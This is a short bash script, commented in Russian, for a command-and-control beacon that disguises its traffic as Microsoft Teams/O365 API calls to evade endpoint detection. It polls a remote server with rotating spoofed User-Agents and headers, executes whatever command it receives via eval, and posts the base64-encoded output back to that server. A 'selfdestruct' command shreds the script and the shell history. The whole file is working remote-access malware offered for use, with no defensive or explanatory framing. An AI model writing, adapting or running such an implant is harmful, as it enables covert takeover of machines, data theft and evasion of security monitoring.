#!/bin/bash
# Modern HTTPS Beacon — маскировка под Microsoft Teams/O365 API
# Обходит EDR за счёт легитимных доменов и заголовков

SERVER=${1:-"https://cdn-update.azureedge.net"}
SLEEP=${2:-5}
JITTER=$((RANDOM % 7 + 3))

# Malleable User-Agent + Headers
UA_LIST=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0"
    "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.17126)"
    "Teams/1.7.00.7956 CFNetwork/1568.100.1"
    "OneDrive/23.230.1107.0003 CFNetwork/1568.100.1"
)
TEAMS_ENDPOINTS=(
    "/v1/chat/messages"
    "/v1/users/me/presence"
    "/v1/teams/search"
    "/api/v2/notifications"
    "/v1/calendar/events"
)

while true; do
    UA="${UA_LIST[$((RANDOM % ${#UA_LIST[@]}))]}"
    EP="${TEAMS_ENDPOINTS[$((RANDOM % ${#TEAMS_ENDPOINTS[@]}))]}"
    
    # Запрос как Teams API
    CMD=$(curl -sk -A "$UA" \
        -H "Authorization: Bearer $(hostname | base64)" \
        -H "X-Client-Version: 1416/1.0.0" \
        -H "X-Skype-TransactionId: $(uuidgen 2>/dev/null || echo $RANDOM)" \
        -H "Accept: application/json" \
        -H "Accept-Language: en-US" \
        -H "ClientInfo: os=Windows; osVer=10; proc=X64; lcid=en-US; deviceType=1; country=US" \
        "$SERVER$EP?ts=$(date +%s)" 2>/dev/null | \
        python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('summary','') or d.get('content',''))" 2>/dev/null)
    
    if [ -n "$CMD" ] && [ "$CMD" != "$LAST" ]; then
        LAST="$CMD"
        [ "$CMD" = "exit" ] && exit 0
        [ "$CMD" = "selfdestruct" ] && shred -u "$0" ~/.bash_history 2>/dev/null && exit 0
        
        RESULT=$(eval "$CMD" 2>&1 | base64 -w0 | head -c 500)
        curl -sk -A "$UA" -X POST "$SERVER/v1/chat/messages" \
            -H "Content-Type: application/json" \
            -d "{\"content\":\"$RESULT\",\"messageType\":\"message\"}" >/dev/null 2>&1
    fi
    
    sleep $((SLEEP + RANDOM % JITTER))
done
